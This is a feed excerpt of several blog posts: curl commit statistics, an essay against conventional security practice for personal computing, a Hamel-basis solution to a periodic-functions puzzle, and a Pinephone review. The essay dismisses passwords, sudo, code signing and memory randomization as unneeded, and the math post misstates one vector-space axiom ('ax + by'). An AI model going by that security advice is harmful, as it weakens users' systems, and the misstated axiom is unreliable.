<figure><a href="https://curl.haxx.se/dashboard1.html#daniel-vs-rest"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I‚Äôve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of ‚Äúcurl time‚Äù per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren‚Äôt included in this commit number. For example, I have done over 4,400 commits in curl‚Äôs website repository.</p>



<p>With these my first 15,000 commits I‚Äôve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to ‚Äúmodern times‚Äù, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I‚Äôve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more ‚Äúoops‚Äù commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#authors"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#coreteam-per-year"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl‚Äôs top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I‚Äôve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won‚Äôt start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I‚Äôm present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There‚Äôs a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>



<figure><a href="https://twitter.com/bagder/status/1302345161272418307"><img loading="lazy" width="825" height="493" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png 825w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-450x269.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-200x120.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-768x459.png 768w" sizes="(max-width: 825px) 100vw, 825px"></a></figure>



<p>I showed these results to my wife. She approved.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525665</guid>
            <pubDate>Sat, 19 Sep 2020 06:43:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Small Computing and the Security Mindset]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525475">thread link</a>) | @zdw
<br/>
September 18, 2020 | http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html | <a href="https://web.archive.org/web/*/http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<header>

</header>
<section data-field="subtitle">
The story of modern computing is the story of the big-computing mindset (scale, centralization, elitism, and paternalism) infecting‚Ä¶
</section>
<section data-field="body">
<section name="3648"><div><div><h3 name="8f02" id="8f02">Small Computing and the Security&nbsp;Mindset</h3><p name="3181" id="3181">The story of modern computing is the story of the big-computing mindset (scale, centralization, elitism, and paternalism) infecting everything it touches as programming becomes more of a profession than a craft. In the process, it creates edifices of practices‚Ää‚Äî‚Ääuseful in big-computing situations‚Ää‚Äî‚Ääthat get unthinkingly applied outside of their appropriate bounds, forcing small-computing projects into the strictures of big-computing design. One major domain where we must begin to think critically about the big- vs small-computing distinction is security.</p><p name="46d1" id="46d1">Small-computing systems ought to be secure. After all, they are our most personal environments! They are our diaries and our artworks and our dream journals! But computer security, as it has become professionalized, has become more and more focused on big-computing environments, and good security practices in those environments are inimical to the basic tenets of small computing.</p><p name="369b" id="369b">In a big-computing environment, valuable secrets (like credit card numbers) and desirable powers (like the ability to tweet on behalf of the president) are kept on a set of machines owned by a single entity (the corporation) on behalf of the ostensible owners of that information and power (particular end-users) and protected from illegitimate access (hacking/cracking) by an elite set of professionals (software engineers, ops teams, security consultants) who use their monopoly on legitimate access to certain power (superuser &amp; administrator privileges, commit access) to construct laws (security policies) that prohibit as many not-explicitly-allowed operations as possible. Because the adversaries are many, with infinite time and energy, and because the treasure is valuable, and because laws always have unseen loopholes, these elite professionals construct layers upon layers of rules to limit not only what users (legitimate or illegitimate) can do, but what kind of feedback they can receive.</p><p name="c145" id="c145">This mentality has even made its way into language design: Java (and C++) have a rudimentary form of access control where members can be marked private, and good style in these languages is to mark all member data as private and write accessor functions, ostensibly in order to perform validity checks on proposed modification. This boilerplate is added rather than doing the sensible thing and creating custom metatables such that assignments are implicitly passed through an integrity check (as may be done in Python and Lua). Of course, such checks are rarely implemented, and they cannot distinguish between ‚Äòauthorized‚Äô and ‚Äòunauthorized‚Äô calling-classes anyhow‚Ää‚Äî‚Ääwhile C++ has ‚Äòfriend classes‚Äô that can modify private data directly, and both support using inheritance hierarchies to control data access, there is no granularity smaller than kin/friend versus outsider, so these access controls are borderline useless for everything besides the ad-hoc plugging failures of the type system and increasing the line count of codebases.</p><p name="c4c2" id="c4c2">Systems that require big-computing style security exist. Problems that are best suited to those systems also exist‚Ää‚Äî‚Ääyour bank ought to not only have big-computing style security, but ought to have substantially better security than it has. But, this model is not really sensible in many of the places it is used. For instance, Google Docs (which simulates a word processor with some limited support for simultaneous editing by multiple users) is locked into this model only because it is client-server, and a hypothetical local-first or peer-to-peer version should not be so professionalized and stratified; Microsoft Word, being a local application, has no legitimate excuse (though the real reason, as with most big-computing systems, is that unnecessary centralization is a very effective way to squeeze money out of users who don‚Äôt know any better).</p><p name="d95a" id="d95a">When I use Google Docs, I can modify the javascript running on my browser, modify the cookies being sent to the server, and modify URL parameters. If I do something wrong, I will get an entirely unhelpful error message from inside the black box of the remote server. This is because, by failing to fall precisely in line with the Alphabet Corporation‚Äôs desired behavior, I have become an adversary, and adversaries cannot be given information that might help them do whatever they might want to do (since some of the things they might want to do is get, for instance, the credit card numbers of everyone who has ever bought an advertisement). Of course, Google engineers writing and maintaining Google Docs face the same situation. Outside of an adversarial situation, investigating a poorly-understood piece of code by poking it and interpreting error messages is called debugging, and part of the small computing ethos is that users should not be prevented from debugging.</p><p name="05d7" id="05d7">The difference between big computing and small computing is, in essence, that in small computing, the user is never an adversary. This is because the running code is owned and controlled by the user. This goes beyond open source / free software (where the developer is no adversary, but the developer is an elite professional often working on behalf of a corporation inside a firewall, performing work that may well be detrimental to those who actually need to interact with its effects).</p><p name="bd41" id="bd41">What kinds of structures befit a small-computing system in an environment where networking exists, and what security models are appropriate for these structures?</p><p name="8df4" id="8df4">For one thing, a multi-user client-server model makes no sense. In a client-server model, whoever controls the single server functionally controls all clients. There is, therefore, incentive to hoard power by locking vital functionalities away on the shared server, making every client dependent‚Ää‚Äî‚Ääslowed by latency when online, shit out of luck when offline, and always under threat of sudden unilateral changes in policy or protocol.</p><p name="d853" id="d853">Instead, we should look to peer to peer systems: direct for real-time communication, and offline-first store-and-forward schemes for everything else. Asymmetric encryption for key exchange and for signing still make sense here, as does hash-based content addressing for storage. Secure Scuttlebutt and IPFS are good models for what small-computing-oriented network technologies of the future might look like: fully distributed, yet resistant to the kinds of threats that regularly take down federated systems like ActivityPub and IRC, because all nodes are equal and all nodes replicate for each other (under cryptographically-enforced anti-spoofing measures).</p><p name="32c0" id="32c0">What does a threat model for small-computing infrastructure look like?</p><p name="2535" id="2535">Well, unlike in big-computing systems, a small-computing system does not (typically) have large numbers of highly motivated dedicated attackers. Fuzzy Bear isn‚Äôt APTing your grandma‚Äôs laptop, because your grandma‚Äôs laptop has nothing on it but christmas MIDIs and questionable nudes. Our threat is really from folks doing large-scale automated sweeps for low-hanging fruit. So, small-computing threat modeling looks like everyday opsec: use encryption, don‚Äôt give strangers direct access to private spaces and limit the spaces they do have access to, distinguish between sensitive and non-sensitive data, and protect the integrity of the system from outsiders. Protect the network-facing portion of your machine, while maximizing your own access to it.</p><p name="aa5a" id="aa5a">In this context, technologies we absolutely do not need are: passwords, SSO, certificate authority hierarchies, name servers and host files, NAT firewalls, code signing, chroot jails, memory layout randomizers, executable symbol stripping, single-application containers, daemons running as ‚Äònobody‚Äô, web APIs for wrapping the web APIs around your web APIs, friend classes, and sudo.</p><p name="9477" id="9477">Technologies we might want to look into: distributed hash tables, chord routing, merkel trees, functional languages, JIT, fast copy-on-write, network-aware cache eviction policies, split-brain countermeasures, transitive blocking, store and forward, message passing, microversioning, journaling, and image-based environments.</p></div></div></section>
</section>
</article></div>]]>
            </description>
            <link>http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525475</guid>
            <pubDate>Sat, 19 Sep 2020 05:54:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[From Vector Spaces to Periodic Functions]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525383">thread link</a>) | @susam
<br/>
September 18, 2020 | https://susam.in/blog/from-vector-spaces-to-periodic-functions/ | <a href="https://web.archive.org/web/*/https://susam.in/blog/from-vector-spaces-to-periodic-functions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>By <b>Susam Pal</b> on 30 Jan 2019</p>
<h2 id="vector-spaces"><a href="#vector-spaces">Vector Spaces</a></h2>
<p>
A fascinating result that appears in linear algebra is the fact that the
set of real numbers \( \mathbb{R} \) is a vector space over the set of
rational numbers \( \mathbb{Q}. \) This may appear surprising at first
but it is easy to show that it is indeed so by checking that all eight
axioms of vector spaces hold good:
</p>

<ol>
  <li>
    <p>
      Commutativity of vector addition:<br>
      \( x + y = y + x \) for all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Associativity of vector addition:<br>
      \( x + (y + z) = (x + y) + z \) for all \( x, y, z \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive identity vector:<br>
      We have \( 0 \in \mathbb{R} \) such that \( x + 0 = x \) for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive inverse vectors:<br>
      There exists \( -x \in \mathbb{R} \) for all \( x \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Associativity of scalar multiplication:<br>
      \( a(bx) = (ab)x \) for all \( a, b \in \mathbb{Q} \) and for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over vector addition:<br>
      \( a(x + y) = ax + by \) for all \( a \in \mathbb{Q} \) and for
      all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over scalar addition:<br>
      \( (a + b)x = ax + bx \) for all \( a, b \in \mathbb{Q} \) and for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of scalar multiplicative identity:<br>
      We have \( 1 \in \mathbb{Q} \) such that \( 1 \cdot x = x \) for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
</ol>
<p>
  This shows that the set of real numbers \( \mathbb{R} \) forms a
  vector space over the field of rational numbers \( \mathbb{Q}. \)
  Another quick way to arrive at this fact is to observe that \(
  \mathbb{Q} \subseteq \mathbb{R}, \) that is, \( \mathbb{Q} \) is a
  subfield of \( \mathbb{R}. \) Any field is a vector space over any of
  its subfields, so \( \mathbb{R} \) must be a vector space over \(
  \mathbb{Q}. \)
</p>


<h2 id="problem"><a href="#problem">Problem</a></h2>

<p>
Here is an interesting problem related to vector spaces that I came
across recently:
</p>

<div>
<p>
Define two periodic functions \( f \) and \( g \) from \( \mathbb{R} \)
to \( \mathbb{R} \) such that their sum \( f + g \) is the identity
function. The axiom of choice is allowed.
</p>
<p>
A function \( f \) is periodic if there exists \( p \gt 0 \) such that
\( f(x + p) = f(x) \) for all \( x \) in the domain.
</p>
</div>

<p>
<em>
If you want to think about this problem, this is a good time to pause
and think about it. There are spoilers ahead.
</em>
</p>


<h2 id="solution"><a href="#solution">Solution</a></h2>

<p>
The axiom of choice is equivalent to the statement that every vector
space has a basis. Since the set of real numbers \( \mathbb{R} \) is a
vector space over the set of rational numbers \( \mathbb{Q}, \) there
must be a basis \( \mathcal{H} \subseteq \mathbb{R} \) such that every
real number \( x \) can be written uniquely as a finite linear
combination of elements of \( \mathcal{H} \) with rational coefficients,
that is,
\[
  x = \sum_{a \in \mathcal{H}} x_a a
\]
where each \( x_a \in \mathbb{Q} \) and \( \{ a \in \mathcal{H} \mid x_a
\ne 0 \} \) is finite. The set \( \mathcal{H} \) is also known as the
Hamel basis.
</p>

<p>
We know that \( b_a = 0 \) for distinct \( a, b \in \mathcal{H} \)
because \( a \) and \( b \) are basis vectors.
</p>

<p>
In the above expansion of \( x, \) each \( x_a \) is a rational number
that appears as the coefficient of the basis vector \( a. \) Therefore
\( (x + y)_{a} = x_a + y_a \) for all \( x, y \in \mathbb{R}. \) Thus \(
(x + b)_{a} = x_a + b_a = x_a + 0 = x_a. \) This shows that a function
\( f(x) = x_a \) is a periodic function with period \( b \) for any \( b
\in \mathcal{H} \setminus \{a\}. \)
</p>

<p>
Let us define two functions:
\begin{align*}
  f(x) &amp; = \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a,
  &amp;
  g(x) &amp; = x_b b.
\end{align*}
where \( b \in \mathcal{H} \) and \( x \in \mathbb{R}. \) Let us
choose \( c \in \mathcal{H} \) such that \( c \ne b. \) Then \( f(x) \)
is a periodic function with period \( b \) and \( g(x) \) is a periodic
function with period \( c. \) Further,
\[
  f(x) + g(x)
  = \left( \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a \right) + x_b b
  = \sum_{a \in \mathcal{H}} x_a a
  = x.
\]
Thus \( f(x) \) and \( g(x) \) are two periodic functions such that
their sum is the identity function.
</p>


<h2 id="references"><a href="#references">References</a></h2>
<ul>
  <li>
    <a href="https://mathworld.wolfram.com/VectorSpace.html">Vector
    Space</a> (by Eric W. Weisstein)
  </li>
  <li>
    <a href="https://web.archive.org/web/20141026224511/https://drexel28.wordpress.com/2010/10/22/the-dimension-of-r-over-q/">The
    Dimension of R over Q</a> (by Alex Youcis)
  </li>
  <li>
    <a href="https://mathblag.wordpress.com/2013/09/01/sums-of-periodic-functions/">Sums
  of Periodic Functions</a> (by David Radcliffe)
  </li>
</ul>



</div></div>]]>
            </description>
            <link>https://susam.in/blog/from-vector-spaces-to-periodic-functions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525383</guid>
            <pubDate>Sat, 19 Sep 2020 05:29:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hand-Optimizing VLIW Assembly Language as a Game]]>
            </title>
            <description>
<![CDATA[
Score 56 | Comments 31 (<a href="https://news.ycombinator.com/item?id=24525372">thread link</a>) | @luu
<br/>
September 18, 2020 | http://silverspaceship.com/hovalaag/ | <a href="https://web.archive.org/web/*/http://silverspaceship.com/hovalaag/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://silverspaceship.com/hovalaag/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525372</guid>
            <pubDate>Sat, 19 Sep 2020 05:27:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Review of Pinephone PostmarketOS CE]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24525210">thread link</a>) | @vidak
<br/>
September 18, 2020 | https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini | <a href="https://web.archive.org/web/*/https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div><p>The version of the Pinephone that I am reviewing is the postmarketOS</p><p>Community Edition (CE).</p><p>My first impression of the Pinephone after I unboxed the device was</p><p>very good. I enjoyed the feeling of the weight of the Pinephone in my</p><p>hand, and the overall build quality of the system still impresses</p><p>me. It is my opinion that the PINE64 hardware development and</p><p>manufacturing process is very solid. For what I paid, which was about</p><p>AUD$200 all up, I believe I have received hardware that is superior</p><p>than a phone that I could have bought from a retail store in my city</p><p>for the same price.</p><p>The screen is glossy, and the capacitive touch screen (this is a</p><p>question fellow smolnet citizen Shufei wanted answered in some detail)</p><p>responds well.</p><p>I was, however, disappointed with the stock postmarketOS software that</p><p>came flashed on the eMMC. The Software Centre was a particular</p><p>disappointment. It, by default, only showed the currently installed</p><p>software, and it was not possible to browse any other software which</p><p>was not already installed.</p><p>Also, the camera application that came installed by default, 'Cheese',</p><p>did not allow the camera to function.</p><p>I attempted to install Plasma Mobile using the command line, following</p><p>these instructions:</p><p>But it ended up completely wrecking the function of the</p><p>phone. Installing the package that the wiki article recommended did</p><p>not update LightDM, and I ended up soft-bricking the phone while</p><p>fiddling with the LightDM configuration in order to stop the phone</p><p>from (still) booting into phosh, and not Plasma Mobile.</p><p>It also disabled cell data functionality, and ended up messing with a</p><p>lot of the guts of the Linux installation. So I do not recommend</p><p>attempting to switch to Plasma Mobile on the Pinephone from inside an</p><p>already-existing postmarketOS installation. I recommend getting a</p><p>Plasma Mobile system image, and flashing that from the start if you</p><p>wish to experiment with different user interfaces.</p><div><p><span> ##</span></p><h2>Linux Software Distributions</h2></div><p>There is a great many Linux distributions available for the</p><p>Pinephone. The following link to the PINE64 wiki contains a</p><p>more-or-less exhaustive list of each of them:</p><p>The Linux distributions that I tested out are:</p><div><p><span>###</span></p><h3>postmarketOS (phosh UI)</h3></div><p>I enjoyed this system image because it came with a wizard for</p><p>NetworkManager which enabled me to make sure cell data worked most</p><p>consistently. However, the power consumption of this image was</p><p>prohibitively high, and it caused the phone to run very hot. When the</p><p>battery was at 10% charge, rebooting the phone would cause the last of</p><p>this precious charge to be used up, and the phone would run completely</p><p>out of power.</p><p>This image was basically a desktop UI, and did not have many, if any</p><p>mobile UI configurations present. It was rather fun to see the</p><p>Pinephone boot into a full GNOME desktop environment. I imagine if you</p><p>had a bigger screen connected to the Pinephone, you would be quite</p><p>impressed with what this phone could pull off.</p><div><p><span>###</span></p><h3>postmarketOS (Plasma Mobile)</h3></div><p>Slow and buggy, really.</p><p>This distribution has a major problem at the moment: the unlock/power</p><p>button is not properly debounced, and it makes it virtually impossible</p><p>sometimes to unlock the phone. Otherwise, this distribution is very,</p><p>very impressive, and I would actually like to switch to it, because</p><p>cell data works best for Optus on Ubuntu Touch.</p><p>This distribution could indeed be a daily driver for someone if they</p><p>could sort out the button debouncing problem.</p><p>This is a Linux-based operating system that uses a closed-source</p><p>UI. It was so glossy and locked-down in terms of configurability that</p><p>I was turned off using it. It has a great tutorial for teaching you</p><p>the gestures you need to learn in order to use the touch screen.</p><p>I did like the fact that it organised all your contacts and messages</p><p>into interesting metaphors, and it ran reasonably quickly, but there</p><p>is no way of configuring the UI beyond what how it arrives to you.</p><p>This image was fairly slow to run on the Pinephone, but in my opinion</p><p>it is the absolute best demonstration of KDE Plasma Mobile. It was</p><p>very visually impressive, and the menus were full-featured and</p><p>informative. It did not, however, support phone calls or SMS.</p><p>This is my current choice of Linux distribution for the phone. It has</p><p>a software centre full of different and interesting programs,</p><p>including Transmission (torrent client) and GIMP (!!! I have yet to</p><p>install this to see how or if it works well, but the fact that it is</p><p>possible to at least _run_ GIMP in some capacity on the Pinephone</p><p>would like like running Adobe Photoshop on a Samsung Galaxy).</p><p>This is merely anecdotal, and I have not performed any scientific</p><p>tests to work out if this is true, but the latest September 2020</p><p>stable release of this image seems to have the best power settings of</p><p>any of the other distributions for this phone.</p><p>I hesitate to give an estimate of exactly how long this phone will</p><p>last on a single charge, given normal use. But, I finished charging</p><p>this phone at 0700HRS this morning, and, with no other charge, it is now</p><p>on 50% charge, and the current time is 1230HRS. I think I have put the</p><p>phone through a little heavier use than I do normally, this morning,</p><p>however.</p><p>Virtually all of the functions of the phone are enabled without any</p><p>configuration in Mobian.</p><p>I highly recommend flashing the following system image to an SD card</p><p>so you can try out all the major Linux distributions for your phone:</p><p>It contains 13 different distributions, and it is trivial to switch</p><p>between each of them through the main boot menu.</p><p>I have rung a few people on the phone, and, assuming you have a</p><p>distribution flashed on the phone that supports phonecalls (like the</p><p>one I am currently using, Mobian), there should be absolutely no issue</p><p>using this fundamental feature of the Pinephone.</p><p>For the most part, the cell data modem in the Pinephone works well for</p><p>me. There is a fairly large problem with my use of the Pinephone with</p><p>its cell data, however.</p><p>I live in Australia, and the mobile phone carrier that I use is</p><p>Optus. The setup(s) that work for me with my Pinephone, running</p><p>Mobian, is:</p><p>&gt; Name: 1</p><p>&gt; APN: yesinternet</p><p>&gt; Name: Optus Yes Internet</p><p>&gt; APN: yesinternet</p><p>After about 3 or 4 hours after I boot up the phone, the cell data</p><p>stops working, and the Network Mode in the 'Mobile' submenu of</p><p>Settings changes from</p><p>&gt; 2G, 3G, 4G (Preferred)</p><p>to just</p><p>&gt; 2G, 3G, 4G</p><p>This issue is fixed for another 3 or 4 hours by rebooting the phone,</p><p>which does not actually take that long (about 10 to 15 seconds), but</p><p>it is a hassle to be cut off from mobile data if you forget about your</p><p>phone.</p><p>These two links help shed light on exactly what is happening with the</p><p>Pinephone when it tries to remain connected to the Optus network:</p><p>(A forum post. Someone using a similar, if not identical mobile data</p><p>modem as the Pinephone in Australia, with the Optus network)</p><p>(A Github post which familiarises the reader with the concepts and</p><p>command line tools involved in using Linux with 4G LTE modems on</p><p>Debian and Ubuntu)</p><p>The issue with the Pinephone is explained the forum thread (the first</p><p>link). The issue is that there are at least two modes for the Quectel</p><p>EG25 modem that the Pinephone uses, only one of which seems to be</p><p>supported by Optus. The two modes are QMI and MBIM. Optus, I assume,</p><p>only supoprts MBIM:</p><p>https://forum.gl-inet.com/t/using-rooter-on-the-gl-x750/8983/8 Forum post</p><p>The relevant sentence from the above forum post is:</p><p>&gt; Also, MBIM is buggy for Quectel modems even in OpenWRT 19.07</p><p>&gt; (snapshot), mostly sometimes modem ‚Äúfreezes‚Äù and I need to restart.</p><p>The issue that the original poster was having with this modem is</p><p>explained in the same post:</p><p>&gt; The reason is exactly this: user.notice Create Connection:</p><p>&gt; WDA-GET-DATA-FORMAT is ‚Äúraw-ip‚Äù </p><p>&gt; When you use a modem over QMI and the data-format is ‚Äúraw-ip‚Äù the</p><p>&gt; system needs to know that modem is on ‚Äúraw-ip‚Äù, without that,</p><p>&gt; interface doesn‚Äôt get an IP address.</p><p>When I was using the postmarketOS version of phosh, the NetworkManager</p><p>program started a wizard which contained a lot more options about how</p><p>to configure the Pinephone's Quectel LTE modem. One activity I would</p><p>like to carry out is learning how to start this wizard from within</p><p>Mobian. I wish to keep Mobian as the primary operating system for the</p><p>Pinephone just because its Software Centre has such an amazing</p><p>quantity and quality of different programs, and the postmarketOS</p><p>Centre requires you to manually search for the programs you want, in</p><p>order for them to show up at all inside the Centre.</p><p>The GPS seems to function perfectly fine inside the default Mobian</p><p>maps program. It can show you, with reasonable accuracy (although not</p><p>to the same accuracy as, say, a proprietary maps application) exactly</p><p>where you are. I think the accuracy of the GPS on the Pinephone is</p><p>somewhere in the region of 10 square metres.</p><p>The main issue with the GPS, however, is that it does not currently</p><p>link in with the Perth public transport system. I cannot use this</p><p>program to plan public transport journeys. But I believe I should be</p><p>able to take care of this problem by either (a) adding data to</p><p>OpenStreetMap, or (b) using a web browser, where I should be able to</p><p>access the Transperth public transport trip planner webpage.</p><p>This is a feature that works without a hitch in Mobian. I was</p><p>surprised to see myself receiving SMS messages unexpectedly from</p><p>friends as I left the phone in my pocket and forgot about it.</p><p>The camera application in Mobian works. However it has a refresh rate</p><p>of around 1 FPS. The quality is passable. This is not an issue for me</p><p>because, philosophically, phone cameras should not replace the</p><p>function of proper dedicated photographic devices. Will this camera</p><p>take reasonable photos? Yes. What is the comparison of the quality of</p><p>the photos? I would venture a guess that it is about as good as a</p><p>cheap action camera, like a GoPro knock-off.</p><div><p><span> ##</span></p><h2>Flashing Different Operating Systems</h2></div><p>Compared to the arduous process that one has to go through in order to</p><p>change operating systems on an Android phone, the Pinephone is very</p><p>easy to flash. You can flash data onto both an SD card, or the phone's</p><p>internal eMMC.</p><p>For flashing an SD card, the process is as ‚Ä¶</p></div></div></div>
